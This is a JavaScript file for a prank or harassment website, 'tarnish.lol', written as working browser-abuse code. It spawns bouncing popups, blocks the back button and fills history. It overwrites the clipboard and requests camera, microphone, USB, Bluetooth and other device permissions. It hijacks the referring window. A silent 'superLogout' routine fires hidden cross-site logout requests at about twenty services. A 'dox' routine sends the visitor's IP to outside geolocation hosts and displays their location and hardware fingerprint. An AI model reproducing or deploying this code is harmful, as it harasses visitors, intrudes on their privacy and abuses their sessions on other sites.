// ===== TARNISH.LOL - POPUP ENGINE =====
const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
  `
]

const SEARCHES = ['tarnish', 'tarnish.lol', 'tarnished', 'tarnished lol']
const PHRASES = ['tarnish', 'tarnish dot lol', 'you have been tarnished']

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', { provider: null, voip_provider: null }],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Roblox: ['POST', 'https://auth.roblox.com/v2/logout']
}

const wins = []
let interactionCount = 0
const veryLongString = repeatStringNumTimes(repeatStringNumTimes('tarnished ', 100), 1500)
let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1
const isParentWindow = !isChildWindow

initTarnish()

function initTarnish() {
  confirmPageUnload()
  if (isChildWindow) {
    initChildWindow()
  } else {
    initParentWindow()
  }
}

function initChildWindow() {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  detectWindowClose()
  rainbowThemeColor()
  animateUrlWithEmojis()
  interceptUserInput(event => {
    if (interactionCount === 0) startAlertInterval()
    triggerPerClickPayload(event)
  })
}

function initParentWindow() {
  // triggered externally by the enter screen click in HTML
}

function launchTarnish() {
  if (interactionCount === 0) {
    blockBackButton()
    fillHistory()
    registerProtocolHandlers()
    attemptToTakeoverReferrerWindow()
    hideCursor()
    startAlertInterval()
    rainbowThemeColor()
    animateUrlWithEmojis()
    interceptUserInput(triggerPerClickPayload)
  }
  triggerPerClickPayload({ preventDefault: () => {}, stopPropagation: () => {} })
}

function interceptUserInput(handler) {
  document.body.addEventListener('touchstart', handler, { passive: false })
  document.body.addEventListener('mousedown', handler)
  document.body.addEventListener('mouseup', handler)
  document.body.addEventListener('click', handler)
  document.body.addEventListener('keydown', handler)
  document.body.addEventListener('keyup', handler)
  document.body.addEventListener('keypress', handler)
}

function triggerPerClickPayload(event) {
  interactionCount += 1
  if (event && event.preventDefault) {
    event.preventDefault()
    event.stopPropagation()
  }
  openWindow()
  startVibrateInterval()
  focusWindows()
  copySpamToClipboard()
  startTheramin()
  if (event && (event.key === 'Meta' || event.key === 'Control')) {
    window.print()
    requestWebauthnAttestation()
    window.print()
  } else {
    requestPointerLock()
    if (!window.ApplePaySession) requestWebauthnAttestation()
    requestClipboardRead()
    requestMidiAccess()
    requestBluetoothAccess()
    requestUsbAccess()
    requestSerialAccess()
    requestHidAccess()
    requestCameraAndMic()
    requestFullscreen()
  }
}

function attemptToTakeoverReferrerWindow() {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    try { window.opener.location = `${window.location.origin}/?child=true` } catch (e) {}
  }
}

function isParentSameOrigin() {
  try { return window.opener.location.origin === window.location.origin } catch (err) { return false }
}

function confirmPageUnload() {
  window.addEventListener('beforeunload', event => {
    speak("Please don't go!")
    event.returnValue = true
  })
}

function registerProtocolHandlers() {
  if (typeof navigator.registerProtocolHandler !== 'function') return
  const protocolWhitelist = ['bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms', 'news', 'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp']
  const handlerUrl = window.location.href + '/url=%s'
  protocolWhitelist.forEach(proto => {
    try { navigator.registerProtocolHandler(proto, handlerUrl, 'tarnish.lol') } catch(e) {}
  })
}

function requestCameraAndMic() {
  if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') return
  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter(d => d.kind === 'videoinput')
    if (!cameras.length) return
    const camera = cameras[cameras.length - 1]
    navigator.mediaDevices.getUserMedia({ deviceId: camera.deviceId, facingMode: ['user', 'environment'], audio: true, video: true })
      .then(stream => {
        const track = stream.getVideoTracks()[0]
        const imageCapture = new window.ImageCapture(track)
        imageCapture.getPhotoCapabilities().then(() => { track.applyConstraints({ advanced: [{ torch: true }] }) }, () => {})
      }, () => {})
  })
}

function animateUrlWithEmojis() {
  if (window.ApplePaySession) return
  const rand = Math.random()
  if (rand < 0.33) animateUrlWithBabies()
  else if (rand < 0.67) animateUrlWithWave()
  else animateUrlWithMoons()

  function animateUrlWithBabies() {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        let m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }
      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave() {
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        let n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4
        s += String.fromCharCode(0x2581 + n)
      }
      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons() {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0
    setInterval(() => {
      let s = ''
      let x = 0
      if (!m) {
        while (d[x] === 4) x++
        if (x >= d.length) m = 1
        else d[x]++
      } else {
        while (d[x] === 0) x++
        if (x >= d.length) m = 0
        else { d[x]++; if (d[x] === 8) d[x] = 0 }
      }
      d.forEach(n => { s += f[n] })
      window.location.hash = s
    }, 100)
  }
}

function requestPointerLock() {
  const api = document.body.requestPointerLock || document.body.webkitRequestPointerLock || document.body.mozRequestPointerLock || document.body.msRequestPointerLock
  if (api) { try { const p = api.call(document.body); if (p && p.catch) p.catch(() => {}) } catch(e) {} }
}

function startVibrateInterval() {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => { window.navigator.vibrate(Math.floor(Math.random() * 600)) }, 1000)
}

function focusWindows() {
  wins.forEach(win => { if (!win.closed) win.focus() })
}

function openWindow() {
  const { x, y } = getRandomCoords()
  const opts = `popup=yes,width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.href + '?child=true', '', opts)
  if (!win) return
  wins.push(win)
  if (wins.length === 2) setupSearchWindow(win)
  win.onbeforeunload = () => ''
}

function hideCursor() {
  document.querySelector('html').style.cursor = 'none'
}

function speak(phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  try { window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase)) } catch(e) {}
}

function startTheramin() {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)()
    const oscillatorNode = audioContext.createOscillator()
    const gainNode = audioContext.createGain()
    const wave = audioContext.createPeriodicWave(
      Array(10).fill(0).map((v, i) => Math.cos(i)),
      Array(10).fill(0).map((v, i) => Math.sin(i))
    )
    oscillatorNode.setPeriodicWave(wave)
    oscillatorNode.connect(gainNode)
    gainNode.connect(audioContext.destination)
    gainNode.gain.value = 0.4
    oscillatorNode.frequency.value = 440
    oscillatorNode.start(0)
    document.body.addEventListener('mousemove', event => {
      const { clientX, clientY } = event
      const { clientWidth, clientHeight } = document.body
      oscillatorNode.frequency.value = 200 + ((clientX - clientWidth / 2) / clientWidth) * 4000
      gainNode.gain.value = 0.2 + Math.abs((clientY - clientHeight / 2) / clientHeight) * 1.3
    })
  } catch(e) {}
}

function requestClipboardRead() {
  try { navigator.clipboard.readText().then(() => {}, () => {}) } catch {}
}

function requestWebauthnAttestation() {
  try {
    navigator.credentials.create({
      publicKey: {
        rp: { name: 'Tarnish' },
        user: { id: new Uint8Array(16), name: 'tarnish', displayName: 'tarnish.lol' },
        pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
        attestation: 'direct',
        timeout: 60000,
        challenge: new Uint8Array([0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9]).buffer
      }
    }).catch(() => {})
  } catch {}
}

function requestMidiAccess() { try { navigator.requestMIDIAccess({ sysex: true }) } catch {} }
function requestBluetoothAccess() { try { navigator.bluetooth.requestDevice({ acceptAllDevices: true }).then(d => d.gatt.connect()).catch(() => {}) } catch {} }
function requestUsbAccess() { try { navigator.usb.requestDevice({ filters: [{}] }).catch(() => {}) } catch {} }
function requestSerialAccess() { try { navigator.serial.requestPort({ filters: [] }).catch(() => {}) } catch {} }
function requestHidAccess() { try { navigator.hid.requestDevice({ filters: [] }).catch(() => {}) } catch {} }

function moveWindowBounce() {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  setInterval(() => {
    const x = window.screenX, y = window.screenY
    const width = window.outerWidth, height = window.outerHeight
    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

function detectWindowClose() {
  window.addEventListener('unload', () => {
    if (window.opener && !window.opener.closed) window.opener.onCloseWindow(window)
  })
}

window.onCloseWindow = function(win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function rainbowThemeColor() {
  const meta = document.querySelector('meta[name="theme-color"]')
  if (!meta) return
  setInterval(() => {
    meta.setAttribute('content', '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'))
  }, 50)
}

function repeatStringNumTimes(string, times) {
  let s = ''
  while (times-- > 0) s += string
  return s
}

function copySpamToClipboard() {
  const span = document.createElement('span')
  span.textContent = veryLongString
  span.style.whiteSpace = 'pre'
  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)
  let win = iframe.contentWindow
  win.document.body.appendChild(span)
  let selection = win.getSelection()
  if (!selection) { win = window; selection = win.getSelection(); document.body.appendChild(span) }
  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)
  try { win.document.execCommand('copy') } catch {}
  selection.removeAllRanges()
  span.remove()
  iframe.remove()
}

function startAlertInterval() {
  setInterval(() => {
    if (Math.random() < 0.5) {
      const art = getRandomArrayEntry(ART)
      window.alert(Array(200).join(art))
    } else {
      window.print()
    }
  }, 30000)
}

function requestFullscreen() {
  const api = Element.prototype.requestFullscreen || Element.prototype.webkitRequestFullscreen || Element.prototype.mozRequestFullScreen || Element.prototype.msRequestFullscreen
  if (api) { try { const p = api.call(document.body); if (p && p.catch) p.catch(() => {}) } catch(e) {} }
}

function superLogout() {
  // silent — no visible messages
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}
    if (method === 'GET') {
      const img = document.createElement('img')
      img.style = HIDDEN_STYLE
      img.onload = img.onerror = () => { if (img.parentNode) img.parentNode.removeChild(img) }
      document.body.appendChild(img)
      img.src = url
    } else {
      const iframe = document.createElement('iframe')
      iframe.style = HIDDEN_STYLE
      iframe.name = 'ti' + numSuperLogoutIframes++
      document.body.appendChild(iframe)
      const form = document.createElement('form')
      form.style = HIDDEN_STYLE
      form.action = url
      form.method = 'POST'
      form.target = iframe.name
      for (const param in params) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
      document.body.appendChild(form)
      form.submit()
    }
  }
}

function blockBackButton() {
  window.addEventListener('popstate', () => window.history.forward())
}

function fillHistory() {
  const base = window.location.href.split('?')[0]
  for (let i = 1; i < 20; i++) {
    try { window.history.pushState({}, '', base + '?q=' + i) } catch(e) {}
  }
  try { window.history.pushState({}, '', base) } catch(e) {}
}

function getRandomCoords() {
  const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

function getRandomArrayEntry(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function setupSearchWindow(win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      try { win.window.location = window.location.href } catch(e) {}
      return
    }
    if (win.closed) { clearInterval(interval); return }
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      try { if (!win.closed) win.moveTo(x, y) } catch(e) {}
      try { if (!win.closed) win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex]) } catch(e) {}
      searchIndex++
    }, 500)
  }, 2500)
}

// ===== IP DOX (from website-main) =====
async function startDox() {
  const body = document.body
  body.style.transition = 'background 0.8s ease-out'
  body.style.background = '#050505'
  setTimeout(() => {
    const doxElement = document.getElementById('dox')
    const doxBgVideo = document.getElementById('dox-bg-vid')
    const doxOverlay = document.getElementById('dox-overlay')
    if (!doxElement) return
    doxElement.style.opacity = '0'
    doxElement.style.display = 'flex'
    doxElement.style.transition = 'opacity 0.8s ease-in'
    setTimeout(() => doxElement.style.opacity = '1', 50)
    doxBgVideo.volume = 1.0
    doxBgVideo.play()
    let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20)
    doxOverlay.style.fontSize = fontSize + 'px'
    doxOverlay.innerHTML = ''

    async function displayInfo(label, value) {
      const spanElement = document.createElement('span')
      spanElement.innerText = label + ': ' + value
      doxOverlay.appendChild(spanElement)
      const overlayHeight = doxOverlay.getBoundingClientRect().height
      if (overlayHeight > window.innerHeight) {
        fontSize -= fontSize / 10
        doxOverlay.style.fontSize = fontSize + 'px'
      }
      await new Promise(resolve => setTimeout(resolve, 300))
    }

    async function fetchAndDisplayIPData() {
      try {
        const ipData = await (await fetch('https://wtfismyip.com/json')).json()
        const locationData = await (await fetch('https://we-are-jammin.xyz/json/' + ipData.YourFuckingIPAddress)).json()
        await displayInfo('IP Address', ipData.YourFuckingIPAddress)
        await displayInfo('Country', locationData.country)
        await displayInfo('Region', locationData.regionName)
        await displayInfo('City', locationData.city)
        await displayInfo('ZIP Code', locationData.zip)
        await displayInfo('Full Location', ipData.YourFuckingLocation)
        await displayInfo('Latitude', locationData.lat)
        await displayInfo('Longitude', locationData.lon)
        await displayInfo('Timezone', locationData.timezone)
        await displayInfo('Current Time', new Date().toLocaleString())
        await displayInfo('ISP', locationData.isp)
        await displayInfo('Organization', locationData.org)
        await displayInfo('Autonomous System', locationData.as)
        await displayInfo('Referrer', document.referrer || 'None')
        await displayInfo('System Languages', navigator.languages.join(', '))
        await displayInfo('Screen Width', screen.width + 'px')
        await displayInfo('Screen Height', screen.height + 'px')
        if (screen.width !== window.outerWidth || screen.height !== window.outerHeight) {
          await displayInfo('Window Width', window.outerWidth + 'px')
          await displayInfo('Window Height', window.outerHeight + 'px')
        }
        await displayInfo('Display Pixel Depth', screen.pixelDepth)
        if (typeof screen.orientation !== 'undefined') {
          await displayInfo('Screen Orientation', screen.orientation.type.split('-')[0])
          await displayInfo('Screen Rotation', screen.orientation.angle + ' degrees')
        }
        await displayInfo('CPU Threads', navigator.hardwareConcurrency)
        if (typeof window.performance.memory !== 'undefined') {
          await displayInfo('Available Browser Memory', Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) + 'MB')
        }
        const canvas = document.createElement('canvas')
        let gl, debugInfo
        try {
          gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
          debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
        } catch (_) {}
        if (gl && debugInfo) {
          await displayInfo('GPU Vendor', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL))
          await displayInfo('GPU Info', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL))
        }
      } catch(e) {
        const s = document.createElement('span')
        s.innerText = 'Failed to fetch IP data.'
        doxOverlay.appendChild(s)
      }
    }
    fetchAndDisplayIPData()
  }, 800)
}
